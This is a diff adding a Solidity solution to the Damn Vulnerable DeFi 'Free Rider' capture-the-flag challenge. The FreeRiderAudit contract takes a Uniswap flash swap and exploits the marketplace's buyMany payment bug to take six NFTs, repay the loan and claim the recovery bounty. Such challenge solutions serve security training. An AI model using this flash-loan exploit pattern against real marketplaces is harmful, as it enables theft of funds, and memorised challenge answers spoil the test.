@@ -12,6 +12,74 @@ import {FreeRiderNFTMarketplace} from "../../src/free-rider/FreeRiderNFTMarketpl
 import {FreeRiderRecoveryManager} from "../../src/free-rider/FreeRiderRecoveryManager.sol";
 import {DamnValuableNFT} from "../../src/DamnValuableNFT.sol";
 
+
+contract FreeRiderAudit {
+    IUniswapV2Pair uniswapPair;
+    FreeRiderNFTMarketplace marketplace;
+    DamnValuableNFT nft;
+    FreeRiderRecoveryManager recoveryManager;
+    WETH weth;
+    address player;
+
+    constructor (
+        IUniswapV2Pair _uniswapPair, FreeRiderRecoveryManager _recoveryManager,
+        FreeRiderNFTMarketplace _marketplace, WETH _weth,
+        DamnValuableNFT _nft, address _player
+        ) {
+        uniswapPair = _uniswapPair;
+        recoveryManager = _recoveryManager;
+        marketplace = _marketplace;
+        weth = _weth;
+        nft = _nft;
+        player = _player;
+    }
+    function onERC721Received(
+    address,
+    address,
+    uint256,
+    bytes calldata
+) external pure returns (bytes4) {
+    return this.onERC721Received.selector;
+}
+
+    function uniswapV2Call(
+        address,
+        uint256,
+        uint256,
+        bytes calldata
+    ) external {
+    
+        uint256[] memory tokenIds = new uint256[](6);
+        uint256 borrowed = 15 ether;
+        uint256 fee = (borrowed * 3) / 997 + 1;
+        uint256 repayment = borrowed + fee;
+        for (uint256 i = 0; i < tokenIds.length; i++) {
+            tokenIds[i] = i;
+        }
+        weth.withdraw(15 ether);
+        marketplace.buyMany{value: 15 ether}(tokenIds);
+        weth.deposit{value: repayment}();
+        weth.transfer(address(uniswapPair), repayment);
+        bytes memory data = abi.encode(player);
+
+        for (uint256 i = 0; i < 6; i++) {
+            nft.safeTransferFrom(address(this), address(recoveryManager), i, data);
+        }
+    }
+
+    function attack() public {
+        uniswapPair.swap(
+            15 ether,
+            0,
+            address(this),
+            abi.encode(15 ether)
+        );
+        payable(player).transfer(address(this).balance);
+    }
+
+    receive() external payable {}
+}
+
 contract FreeRiderChallenge is Test {
     address deployer = makeAddr("deployer");
     address player = makeAddr("player");
@@ -123,7 +191,9 @@ contract FreeRiderChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_freeRider() public checkSolvedByPlayer {
-        
+        FreeRiderAudit audit = new FreeRiderAudit(uniswapPair, recoveryManager, marketplace, weth, nft, player);
+        address(audit).call{value: 0.1 ether}("");
+        audit.attack();
     }
 
     /**
